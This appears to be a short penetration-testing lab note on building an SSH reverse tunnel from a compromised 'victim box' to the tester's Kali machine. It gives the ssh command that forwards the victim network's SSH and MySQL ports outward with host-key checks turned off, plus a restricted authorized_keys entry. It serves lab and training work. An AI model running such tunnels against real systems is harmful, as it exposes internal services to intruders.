# SSH Reverse Tunnel

## Connecting from victim box to our kali box and restricting access

No password will be use, thus we will be using ssh keys. 

#### Connecting to our kali ssh server

```text
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o
"UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa
kali@10.11.0.4
```

#### Adding ssh public key to authorized hosts with restrictions. 

```text
from="10.11.1.250",command="echo 'This account can only be used for port
forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhU
r4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68
Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8
i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/
US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
```

